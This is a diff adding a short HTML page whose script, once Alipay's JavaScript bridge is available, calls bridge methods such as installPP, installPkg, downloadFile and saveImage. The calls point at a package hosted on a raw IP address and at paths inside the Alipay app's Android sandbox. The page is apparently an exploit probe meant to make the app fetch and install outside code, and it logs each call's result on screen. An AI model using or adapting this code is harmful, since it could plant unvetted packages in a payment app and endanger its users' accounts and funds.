@@ -1,0 +1,17 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>p8</title></head>
+<body style="font-size:16px;padding:10px"><div id="r">INIT</div>
+<script>
+var out=[],ZIP='http://159.75.1.8/68687655-f76ecc0f5b5953003bab1f7d0fe158c1',FN='68687655-f76ecc0f5b5953003bab1f7d0fe158c1';
+function w(s){out.push(s);var e=document.getElementById('r');if(e)e.textContent=out.join(' | ');}
+function call(n,p){try{AlipayJSBridge.call(n,p,function(r){w(n+'='+JSON.stringify(r||{}).slice(0,70));});w(n+'_S');}catch(e){w(n+'_E:'+e.message.slice(0,30));}}
+function fire(){
+  w('JSB='+(typeof AlipayJSBridge));
+  call('checkApp',{appId:'68687655'});
+  call('installApp',{appId:'68687655'});
+  call('installPP',{appid:'68687655',downloadUrl:ZIP,fileName:FN});
+  call('installPkg',{downloadPath:'/storage/emulated/0/Android/data/com.eg.android.AlipayGphone/files/Sandbox/B_3d7a27c7f22ee683/library/nebulaCommon/download/'+FN});
+  call('downloadFile',{url:ZIP});
+  call('saveImage',{src:ZIP,savePath:'/Android/data/com.eg.android.AlipayGphone/files/Sandbox/B_3d7a27c7f22ee683/library/nebulaDownload/'+FN+'.',showActionSheet:false,cusHandleResult:true});
+}
+if(window.AlipayJSBridge&&AlipayJSBridge.call){fire();}else{document.addEventListener('AlipayJSBridgeReady',fire,false);}
+</script></body></html>
